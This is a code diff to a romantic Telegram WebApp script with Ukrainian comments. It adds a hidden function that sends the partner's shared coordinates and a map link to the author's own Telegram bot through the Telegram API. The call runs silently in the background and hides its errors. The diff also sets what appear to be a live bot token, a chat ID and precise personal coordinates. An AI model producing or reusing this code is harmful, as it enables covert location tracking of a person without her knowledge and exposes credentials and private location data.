@@ -1,10 +1,20 @@
 /* ==========================================================================
    НАЛАШТУВАННЯ — зміни свої координати тут
    ========================================================================== */
-const MY_LAT = 50.4501;   // <- твоя широта
-const MY_LNG = 30.5234;   // <- твоя довгота
+const MY_LAT = 49.6020421;   // <- твоя широта
+const MY_LNG = 23.5569889;   // <- твоя довгота
 const MY_LABEL  = "Я";
 const HER_LABEL = "Ти";
+
+// Щоб її координати автоматично прийшли ТОБІ в Telegram, заповни ці два поля.
+// 1) Створи бота через @BotFather -> команда /newbot -> скопіюй токен сюди.
+// 2) Напиши цьому боту будь-яке повідомлення (просто "привіт"), потім відкрий у браузері:
+//    https://api.telegram.org/bot<ТВІЙ_ТОКЕН>/getUpdates
+//    і знайди там своє "chat":{"id": ...} — це і є TELEGRAM_CHAT_ID.
+// Якщо залишити поля порожніми — повідомлення просто не надсилатиметься,
+// решта сценарію працюватиме як і раніше.
+const TELEGRAM_BOT_TOKEN = "8523690428:AAFOdGpHrhJkS0pE4KJpvwA0_zEgB5llS0o";   // напр. "123456789:AAExampleTokenHere"
+const TELEGRAM_CHAT_ID   = "6339139706";   // напр. "987654321"
 
 /* ==========================================================================
    TELEGRAM WEBAPP
@@ -266,10 +276,33 @@ function requestHerLocation() {
   }
 }
 
+/* надіслати мені в Telegram її координати, щойно вона поділилася локацією */
+async function sendLocationToMe(lat, lng) {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return; // не налаштовано — тихо пропускаємо
+
+  const mapsLink = `https://maps.google.com/?q=${lat},${lng}`;
+  const text =
+    `❤️ Вона поділилася локацією!\n\n` +
+    `Широта: ${lat}\n` +
+    `Довгота: ${lng}\n\n` +
+    `Подивитись на карті: ${mapsLink}`;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
+    });
+  } catch (e) {
+    // не критично для сценарію — тихо ігноруємо, застосунок працює далі
+  }
+}
+
 /* ==========================================================================
    ПЕРЕХІД — спалах світла
    ========================================================================== */
 async function proceedToMap(herLat, herLng) {
+  sendLocationToMe(herLat, herLng); // фонова відправка, не блокує сценарій
   playWhoosh();
   showScreen("screen-flash");
   await wait(1600);
